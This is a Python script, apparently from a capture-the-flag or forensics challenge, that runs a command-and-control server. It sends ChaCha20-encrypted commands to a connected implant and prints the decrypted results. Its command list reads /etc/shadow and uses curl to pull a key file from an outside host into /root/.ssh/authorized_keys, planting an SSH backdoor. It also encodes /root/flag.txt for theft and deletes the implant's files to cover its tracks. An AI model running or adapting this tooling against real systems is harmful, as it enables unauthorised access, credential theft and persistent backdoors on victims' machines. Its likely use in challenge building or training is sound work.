from socket import socket, AF_INET, SOCK_STREAM, SO_REUSEADDR, SOL_SOCKET
from Crypto.Cipher import ChaCha20

#generate the PRNG seed
rport = 21
rhost = "172.17.0.1"
seed = [250, 205, 247, 69, 141, 132, 131, 178, 20, 25, 122, 114, 69, 170, 212, 92, 79, 242, 151, 228, 185, 2, 147, 2, 114, 52, 227, 195, 93, 234, 144, 105]

#the server
cipher = ChaCha20.new(key=bytes(seed), nonce=b"meow-warez:3")
with socket(AF_INET, SOCK_STREAM, 0) as sock:
	sock.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)
	sock.bind((rhost, rport))
	sock.listen()

	commands = [
		"id",
		"pwd",
		"cat /etc/shadow",
		"curl http://knowledge-universal/authorization -o /root/.ssh/authorized_keys",
		"ls -laR /root",
		"md5sum /root/.ssh/authorized_keys",
		"base64 /root/flag.txt",
		"rm symbols.zip",
		"rm disk_cleanup",
		"exit"
	]

	conn, addr = sock.accept()
	for raw_cmd in commands:
		print(f"sending {raw_cmd}")

		#send length of the command
		cmd = list(raw_cmd.encode("ascii"))
		conn.send(len(cmd).to_bytes(4, "big"))

		#send off the encrypted command
		conn.send(cipher.encrypt(bytes(cmd)))

		#if we're quitting, stop
		if raw_cmd == "exit":
			break

		#read the output
		size = int.from_bytes(conn.recv(4), "big")
		output = cipher.encrypt(conn.recv(size))
		print(output.decode("ascii"))